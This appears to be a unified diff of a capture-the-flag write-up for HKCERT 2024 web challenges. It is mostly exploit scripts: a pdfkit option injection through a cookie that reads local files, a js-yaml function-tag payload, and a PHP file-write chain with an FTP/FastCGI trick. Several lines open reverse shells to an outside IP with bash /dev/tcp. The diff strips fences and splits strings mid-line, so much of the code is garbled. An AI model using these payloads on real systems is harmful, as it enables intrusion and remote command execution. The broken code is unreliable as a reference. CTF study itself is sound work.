@@ -37,7 +37,7 @@ One Way Room
 
 APT攻擊在哪裡 (1)
 
- Web 
+ Web
 
 新免費午餐
 
@@ -154,8 +154,8 @@ def process_url():
     if returncode != 0:
         return f"""
         <h1>Error</h1>
-        <pre>{stdout}</pre>
-        <pre>{stderr}</pre>
+        {stdout}
+        {stderr}
         """
       
     return redirect(pdf_file)
@@ -183,19 +183,22 @@ def execute_command(command):
             check=True  # Raises CalledProcessError for non-zero exit codes
         )
         return result.stdout, result.stderr, result.returncode
-    except subprocess.CalledProcessError as e:
+    
+except subprocess.CalledProcessError as e:
         # Return the error output and return code if command fails
         return e.stdout, e.stderr, e.returncode
 
 <html>
-        <iframe src="file:///flag.txt">
+        
 </html>
 
 url = "https://c52a-webpage-to-pdf-1-t519-r36jghu3qed6ru6azopujzln.hkcert24.pwnable.hk/"
 
 def exp():
-    print(requests.post(url + "process",data={"url": "http://8.134.146.39:801/"}, cookies={"session_id": "123"}, allow_redirects=False).text)
-    print(requests.post(url + "process",data={"url": "http://8.134.146.39:801/"}, cookies={"session_id": "--enable-local-file-access 123.html '"}, allow_redirects=False).text)
+    print(requests.post(url + "process",data={"url": "http://8.134.146.39:
+801/"}, cookies={"session_id": "123"}, allow_redirects=False).text)
+    print(requests.post(url + "process",data={"url": "http://8.134.146.39:
+801/"}, cookies={"session_id": "--enable-local-file-access 123.html '"}, allow_redirects=False).text)
 
 exp()
 
@@ -220,7 +223,8 @@ def process_url():
 def _find_options_in_meta(self, content):
         """Reads 'content' and extracts options encoded in HTML meta tags
 
-        :param content: str or file-like object - contains HTML to parse
+        :
+param content: str or file-like object - contains HTML to parse
 
         returns:
           dict: {config option: value}
@@ -241,7 +245,7 @@ def _find_options_in_meta(self, content):
 
 <html>
         <meta name="pdfkit---enable-local-file-access" content="">
-        <iframe src="file:///flag.txt">
+        
 </html>
 
 #include <sys/types.h>
@@ -249,7 +253,7 @@ def _find_options_in_meta(self, content):
 #include <stdio.h>
 #include <netinet/in.h>
 #include <signal.h>
-#include <unistd.h>
+#include 
 #include <string.h>
 #include <stdlib.h>
 #include <stdbool.h>
@@ -451,28 +455,15 @@ app.post('/debug', (req, res) => {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YAML Parser</title>
     <script src="https://cdn.jsdelivr.net/pyodide/v0.26.2/full/pyodide.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 50px;
-        }
-        textarea {
-            width: 100%;
-            height: 200px;
-        }
-        pre {
-            background-color: #cccccc;
-            padding: 20px;
-            white-space: pre-wrap;
-        }
-    </style>
+    
 </head>
-<body>
+
     <h1>YAML Parser</h1>
-    <textarea id="yaml" placeholder="- YAML"></textarea><br>
-    <button id="parse">Parse</button>
+    <textarea id="yaml" placeholder="- YAML"></textarea>
+
+    Parse
     <h2>Output:</h2>
-    <pre id="output"></pre>
+    
 
     <script>
     let pyodide;
@@ -501,7 +492,7 @@ yaml.load("""`+`$`+`{y.replaceAll('"','')}""",yaml.Loader)`+'`'+`;
         onhashchange = runHash;
         onload = init;
     </script>
-</body>
+
 </html>
 
 payload = '''
@@ -524,7 +515,9 @@ fetch('/debug', {
 """
 pyodide.code.run_js(payload)
 '''
-payload = f"http://127.0.0.1:3000/#!!python/object/apply:exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"
+payload = f"http://127.0.0.1:
+3000/#!!python/object/apply:
+exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"
 print(payload)
 
 const yaml = require('js-yaml');
@@ -539,7 +532,8 @@ const yaml = require('js-yaml');
          res.status(400).send('Error');
         }
 
-"toString": !<tag:yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'
+"toString": !<tag:
+yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'
 
 import base64
 
@@ -550,7 +544,8 @@ import pyodide
 payload = """
 document.cookie = "debug=on; path=/;";
 const data = new URLSearchParams();
-data.append('yaml', `"toString": !<tag:yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'`);
+data.append('yaml', `"toString": !<tag:
+yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'`);
 
 fetch('/debug', {
   method: 'POST',
@@ -567,7 +562,9 @@ fetch('/debug', {
 pyodide.code.run_js(payload)
 '''
 
-payload = f"http://127.0.0.1:3000/#!!python/object/apply:exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"
+payload = f"http://127.0.0.1:
+3000/#!!python/object/apply:
+exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"
 
 print(payload)
 
@@ -708,7 +705,8 @@ $ls = $workspace->list();
 ?>
 
 url = "https://c25-chimera-t519-pji6ue6qjfb5c45we2ja6z57.hkcert24.pwnable.hk/citrus.php%3fsss.php"
-# url = "http://8.134.146.39:8080/citrus.php"
+# url = "http://8.134.146.39:
+8080/citrus.php"
 sess = requests.session()
 PHPID = "123"
 t = threading.BoundedSemaphore(10)
@@ -733,7 +731,7 @@ def read_any_file(file):
     create(rand2, rand1)
     create(file, rand1)
     res = read(rand2).text
-    return res.split('<p class="card-text">')[1].split('</div>')[0]
+    return res.split('')[1].split('')[0]
 
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
@@ -770,7 +768,8 @@ import threading
 import requests
 
 url = "https://c25-chimera-t519-pji6ue6qjfb5c45we2ja6z57.hkcert24.pwnable.hk/citrus.php%3fsss.php"
-# url = "http://8.134.146.39:8080/citrus.php"
+# url = "http://8.134.146.39:
+8080/citrus.php"
 sess = requests.session()
 PHPID = "123"
 t = threading.BoundedSemaphore(10)
@@ -795,10 +794,11 @@ def read_any_file(file):
     create(rand2, rand1)
     create(file, rand1)
     res = read(rand2).text
-    return res.split('<p class="card-text">')[1].split('</div>')[0]
+    return res.split('')[1].split('')[0]
 
 write_anyfile("/tmp/a.php", "<?php system('bash -c "bash -i >&/dev/tcp/8.134.146.39/7788 0>&1"'); ?>")
-write_anyfile("ftp://8.134.146.39:333/a.php", base64.b64decode("AQHEAQAIAAAAAQAAAAAAAAEExAEBswAADgFDT05URU5UX0xFTkdUSDAMEENPTlRFTlRfVFlQRWFwcGxpY2F0aW9uL3RleHQLBFJFTU9URV9QT1JUOTk4NQsJU0VSVkVSX05BTUVsb2NhbGhvc3QRC0dBVEVXQVlfSU5URVJGQUNFRmFzdENHSS8xLjAPDlNFUlZFUl9TT0ZUV0FSRXBocC9mY2dpY2xpZW50CwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8KU0NSSVBUX0ZJTEVOQU1FL3RtcC9hLnBocAsKU0NSSVBUX05BTUUvdG1wL2EucGhwCR9QSFBfVkFMVUVhdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DgRSRVFVRVNUX01FVEhPRFBPU1QLAlNFUlZFUl9QT1JUODAPCFNFUlZFUl9QUk9UT0NPTEhUVFAvMS4xDABRVUVSWV9TVFJJTkcPFlBIUF9BRE1JTl9WQUxVRWFsbG93X3VybF9pbmNsdWRlID0gT24NAURPQ1VNRU5UX1JPT1QvCwlTRVJWRVJfQUREUjEyNy4wLjAuMQsKUkVRVUVTVF9VUkkvdG1wL2EucGhwAQTEAQAAAAABBcQBAAAAAA=="))
+write_anyfile("ftp://8.134.146.39:
+333/a.php", base64.b64decode("AQHEAQAIAAAAAQAAAAAAAAEExAEBswAADgFDT05URU5UX0xFTkdUSDAMEENPTlRFTlRfVFlQRWFwcGxpY2F0aW9uL3RleHQLBFJFTU9URV9QT1JUOTk4NQsJU0VSVkVSX05BTUVsb2NhbGhvc3QRC0dBVEVXQVlfSU5URVJGQUNFRmFzdENHSS8xLjAPDlNFUlZFUl9TT0ZUV0FSRXBocC9mY2dpY2xpZW50CwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8KU0NSSVBUX0ZJTEVOQU1FL3RtcC9hLnBocAsKU0NSSVBUX05BTUUvdG1wL2EucGhwCR9QSFBfVkFMVUVhdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DgRSRVFVRVNUX01FVEhPRFBPU1QLAlNFUlZFUl9QT1JUODAPCFNFUlZFUl9QUk9UT0NPTEhUVFAvMS4xDABRVUVSWV9TVFJJTkcPFlBIUF9BRE1JTl9WQUxVRWFsbG93X3VybF9pbmNsdWRlID0gT24NAURPQ1VNRU5UX1JPT1QvCwlTRVJWRVJfQUREUjEyNy4wLjAuMQsKUkVRVUVTVF9VUkkvdG1wL2EucGhwAQTEAQAAAAABBcQBAAAAAA=="))
 
 from base64 import b64decode
 from secrets import token_hex
@@ -854,11 +854,6 @@ print(os.popen(code).read())
 ```
 score = 9999
 endGame()
-```
-
-
-
-```
 from flask import Blueprint, request, jsonify
 from flask.views import MethodView
 import collections
@@ -912,30 +907,15 @@ def init_app(app):
     register_api(app, User, 'users')
     register_api(app, Challenge, 'challenges')
     register_api(app, Attempt, 'attempts')
-```
-
-
-
-```
 @event.listens_for(User.password, 'set', retval=True)
 def hash_user_password(target, value, oldvalue, initiator):
     if value != oldvalue:
         return compute_hash(value)
     return value
-```
-
-
-
-```
 def compute_hash(password, salt=None):
     if salt is None:
         salt = os.urandom(4).hex()
     return salt + '.' + hashlib.sha256(f'{salt}/{password}'.encode()).hexdigest()
-```
-
-
-
-```
 import hashlib
 import itertools
 
@@ -947,11 +927,6 @@ for password in combinations:
         print(password)
 
 # 7df71e
-```
-
-
-
-```
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
     username = db.Column(db.String, nullable=False)
@@ -959,11 +934,6 @@ class User(db.Model):
     password = db.Column(db.String, nullable=False)
     score = db.Column(db.Integer, default=0)
     last_solved_at = db.Column(db.DateTime)
-```
-
-
-
-```
 @app.route('/process', methods=['POST'])
 def process_url():
     # Get the session ID of the user
@@ -987,16 +957,11 @@ def process_url():
     if returncode != 0:
         return f"""
         <h1>Error</h1>
-        <pre>{stdout}</pre>
-        <pre>{stderr}</pre>
+        {stdout}
+        {stderr}
         """
       
     return redirect(pdf_file)
-```
-
-
-
-```
 def execute_command(command):
     """
     Execute an external OS program securely with the provided command.
@@ -1020,34 +985,22 @@ def execute_command(command):
             check=True  # Raises CalledProcessError for non-zero exit codes
         )
         return result.stdout, result.stderr, result.returncode
-    except subprocess.CalledProcessError as e:
+    
+except subprocess.CalledProcessError as e:
         # Return the error output and return code if command fails
         return e.stdout, e.stderr, e.returncode
-```
-
-
-
-```
 <html>
-        <iframe src="file:///flag.txt">
+        
 </html>
-```
-
-
-
-```
 url = "https://c52a-webpage-to-pdf-1-t519-r36jghu3qed6ru6azopujzln.hkcert24.pwnable.hk/"
 
 def exp():
-    print(requests.post(url + "process",data={"url": "http://8.134.146.39:801/"}, cookies={"session_id": "123"}, allow_redirects=False).text)
-    print(requests.post(url + "process",data={"url": "http://8.134.146.39:801/"}, cookies={"session_id": "--enable-local-file-access 123.html '"}, allow_redirects=False).text)
+    print(requests.post(url + "process",data={"url": "http://8.134.146.39:
+801/"}, cookies={"session_id": "123"}, allow_redirects=False).text)
+    print(requests.post(url + "process",data={"url": "http://8.134.146.39:
+801/"}, cookies={"session_id": "--enable-local-file-access 123.html '"}, allow_redirects=False).text)
 
 exp()
-```
-
-
-
-```
 @app.route('/process', methods=['POST'])
 def process_url():
     # Get the session ID of the user
@@ -1065,15 +1018,11 @@ def process_url():
     pdfkit.from_string(response.text, pdf_file)
   
     return redirect(pdf_file)
-```
-
-
-
-```
 def _find_options_in_meta(self, content):
         """Reads 'content' and extracts options encoded in HTML meta tags
 
-        :param content: str or file-like object - contains HTML to parse
+        :
+param content: str or file-like object - contains HTML to parse
 
         returns:
           dict: {config option: value}
@@ -1091,32 +1040,22 @@ def _find_options_in_meta(self, content):
                 found[name] = re.findall('content=["']([^"']*)', x)[0]
 
         return found
-```
-
-
-
-```
 <html>
         <meta name="pdfkit---enable-local-file-access" content="">
-        <iframe src="file:///flag.txt">
+        
 </html>
-```
+    #include <sys/types.h>
+    #include <sys/socket.h>
+    #include <stdio.h>
+    #include <netinet/in.h>
+    #include <signal.h>
+    #include 
+    #include <string.h>
+    #include <stdlib.h>
+    #include <stdbool.h>
 
-
-
-```
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <stdio.h>
-#include <netinet/in.h>
-#include <signal.h>
-#include <unistd.h>
-#include <string.h>
-#include <stdlib.h>
-#include <stdbool.h>
-
-#define PORT 8000
-#define BUFFER_SIZE 1024
+    #define PORT 8000
+    #define BUFFER_SIZE 1024
 
 typedef struct {
     char *content;
@@ -1230,11 +1169,6 @@ int main() {
         }
     }
 }
-```
-
-
-
-```
 import socket
 import ssl
 
@@ -1254,11 +1188,6 @@ ssl_sock.sendall(payload)
 print("sended")
 print(ssl_sock.recv(1024).decode())
 print(ssl_sock.recv(1024).decode())
-```
-
-
-
-```
 import socket
 import ssl
 import threading
@@ -1294,11 +1223,6 @@ Content-Length: {944 + len(path_payload) + 1024}
 
 threading.Thread(target=test).start()
 test()
-```
-
-
-
-```
 app.post('/debug', (req, res) => {
     if(ip.isLoopback(req.ip) && req.cookies.debug === 'on'){
         const yaml = require('js-yaml');
@@ -1316,11 +1240,6 @@ app.post('/debug', (req, res) => {
         res.status(401).send('Unauthorized');
     }
 });
-```
-
-
-
-```
 <!DOCTYPE html>
 <html>
 <head>
@@ -1328,28 +1247,15 @@ app.post('/debug', (req, res) => {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YAML Parser</title>
     <script src="https://cdn.jsdelivr.net/pyodide/v0.26.2/full/pyodide.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 50px;
-        }
-        textarea {
-            width: 100%;
-            height: 200px;
-        }
-        pre {
-            background-color: #cccccc;
-            padding: 20px;
-            white-space: pre-wrap;
-        }
-    </style>
+    
 </head>
-<body>
+
     <h1>YAML Parser</h1>
-    <textarea id="yaml" placeholder="- YAML"></textarea><br>
-    <button id="parse">Parse</button>
+    <textarea id="yaml" placeholder="- YAML"></textarea>
+
+    Parse
     <h2>Output:</h2>
-    <pre id="output"></pre>
+    
 
     <script>
     let pyodide;
@@ -1378,13 +1284,8 @@ yaml.load("""`+`$`+`{y.replaceAll('"','')}""",yaml.Loader)`+'`'+`;
         onhashchange = runHash;
         onload = init;
     </script>
-</body>
+
 </html>
-```
-
-
-
-```
 payload = '''
 import pyodide
 payload = """
@@ -1405,13 +1306,10 @@ fetch('/debug', {
 """
 pyodide.code.run_js(payload)
 '''
-payload = f"http://127.0.0.1:3000/#!!python/object/apply:exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"
+payload = f"http://127.0.0.1:
+3000/#!!python/object/apply:
+exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"
 print(payload)
-```
-
-
-
-```
 const yaml = require('js-yaml');
         let schema = yaml.DEFAULT_SCHEMA.extend(require('js-yaml-js-types').all);
         try{
@@ -1423,17 +1321,8 @@ const yaml = require('js-yaml');
         }catch(e){
          res.status(400).send('Error');
         }
-```
-
-
-
-```
-"toString": !<tag:yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'
-```
-
-
-
-```
+"toString": !<tag:
+yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'
 import base64
 
 url = "https://c62-jspyaml-t519-hev2ottoirslajxbb32csyeq.hkcert24.pwnable.hk/"
@@ -1443,7 +1332,8 @@ import pyodide
 payload = """
 document.cookie = "debug=on; path=/;";
 const data = new URLSearchParams();
-data.append('yaml', `"toString": !<tag:yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'`);
+data.append('yaml', `"toString": !<tag:
+yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'`);
 
 fetch('/debug', {
   method: 'POST',
@@ -1460,14 +1350,11 @@ fetch('/debug', {
 pyodide.code.run_js(payload)
 '''
 
-payload = f"http://127.0.0.1:3000/#!!python/object/apply:exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"
+payload = f"http://127.0.0.1:
+3000/#!!python/object/apply:
+exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"
 
 print(payload)
-```
-
-
-
-```
 <?php
     class CitrusWorkspace {
         function __construct($root) {
@@ -1560,11 +1447,6 @@ print(payload)
 
     }
 ?>
-```
-
-
-
-```
 <?php
 session_start();
 require_once("lime.php");
@@ -1607,13 +1489,9 @@ try {
 
 $ls = $workspace->list();
 ?>
-```
-
-
-
-```
 url = "https://c25-chimera-t519-pji6ue6qjfb5c45we2ja6z57.hkcert24.pwnable.hk/citrus.php%3fsss.php"
-# url = "http://8.134.146.39:8080/citrus.php"
+# url = "http://8.134.146.39:
+8080/citrus.php"
 sess = requests.session()
 PHPID = "123"
 t = threading.BoundedSemaphore(10)
@@ -1638,12 +1516,7 @@ def read_any_file(file):
     create(rand2, rand1)
     create(file, rand1)
     res = read(rand2).text
-    return res.split('<p class="card-text">')[1].split('</div>')[0]
-```
-
-
-
-```
+    return res.split('')[1].split('')[0]
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 s.bind(('0.0.0.0', 333))
@@ -1671,11 +1544,6 @@ conn.send(b'150 Permission denied.n')
 #QUIT
 conn.send(b'221 Goodbye.n')
 conn.close()
-```
-
-
-
-```
 import base64
 import random
 import threading
@@ -1683,7 +1551,8 @@ import threading
 import requests
 
 url = "https://c25-chimera-t519-pji6ue6qjfb5c45we2ja6z57.hkcert24.pwnable.hk/citrus.php%3fsss.php"
-# url = "http://8.134.146.39:8080/citrus.php"
+# url = "http://8.134.146.39:
+8080/citrus.php"
 sess = requests.session()
 PHPID = "123"
 t = threading.BoundedSemaphore(10)
@@ -1708,15 +1577,11 @@ def read_any_file(file):
     create(rand2, rand1)
     create(file, rand1)
     res = read(rand2).text
-    return res.split('<p class="card-text">')[1].split('</div>')[0]
+    return res.split('')[1].split('')[0]
 
 write_anyfile("/tmp/a.php", "<?php system('bash -c "bash -i >&/dev/tcp/8.134.146.39/7788 0>&1"'); ?>")
-write_anyfile("ftp://8.134.146.39:333/a.php", base64.b64decode("AQHEAQAIAAAAAQAAAAAAAAEExAEBswAADgFDT05URU5UX0xFTkdUSDAMEENPTlRFTlRfVFlQRWFwcGxpY2F0aW9uL3RleHQLBFJFTU9URV9QT1JUOTk4NQsJU0VSVkVSX05BTUVsb2NhbGhvc3QRC0dBVEVXQVlfSU5URVJGQUNFRmFzdENHSS8xLjAPDlNFUlZFUl9TT0ZUV0FSRXBocC9mY2dpY2xpZW50CwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8KU0NSSVBUX0ZJTEVOQU1FL3RtcC9hLnBocAsKU0NSSVBUX05BTUUvdG1wL2EucGhwCR9QSFBfVkFMVUVhdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DgRSRVFVRVNUX01FVEhPRFBPU1QLAlNFUlZFUl9QT1JUODAPCFNFUlZFUl9QUk9UT0NPTEhUVFAvMS4xDABRVUVSWV9TVFJJTkcPFlBIUF9BRE1JTl9WQUxVRWFsbG93X3VybF9pbmNsdWRlID0gT24NAURPQ1VNRU5UX1JPT1QvCwlTRVJWRVJfQUREUjEyNy4wLjAuMQsKUkVRVUVTVF9VUkkvdG1wL2EucGhwAQTEAQAAAAABBcQBAAAAAA=="))
-```
-
-
-
-```
+write_anyfile("ftp://8.134.146.39:
+333/a.php", base64.b64decode("AQHEAQAIAAAAAQAAAAAAAAEExAEBswAADgFDT05URU5UX0xFTkdUSDAMEENPTlRFTlRfVFlQRWFwcGxpY2F0aW9uL3RleHQLBFJFTU9URV9QT1JUOTk4NQsJU0VSVkVSX05BTUVsb2NhbGhvc3QRC0dBVEVXQVlfSU5URVJGQUNFRmFzdENHSS8xLjAPDlNFUlZFUl9TT0ZUV0FSRXBocC9mY2dpY2xpZW50CwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8KU0NSSVBUX0ZJTEVOQU1FL3RtcC9hLnBocAsKU0NSSVBUX05BTUUvdG1wL2EucGhwCR9QSFBfVkFMVUVhdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DgRSRVFVRVNUX01FVEhPRFBPU1QLAlNFUlZFUl9QT1JUODAPCFNFUlZFUl9QUk9UT0NPTEhUVFAvMS4xDABRVUVSWV9TVFJJTkcPFlBIUF9BRE1JTl9WQUxVRWFsbG93X3VybF9pbmNsdWRlID0gT24NAURPQ1VNRU5UX1JPT1QvCwlTRVJWRVJfQUREUjEyNy4wLjAuMQsKUkVRVUVTVF9VUkkvdG1wL2EucGhwAQTEAQAAAAABBcQBAAAAAA=="))
 from base64 import b64decode
 from secrets import token_hex
 import subprocess
@@ -1752,11 +1617,6 @@ with tempfile.TemporaryDirectory() as td:
 
     print(f"You are an experienced Go developer, here's your flag: {FLAG}")
     sys.exit(1)
-```
-
-
-
-```
 package main
 
 import (
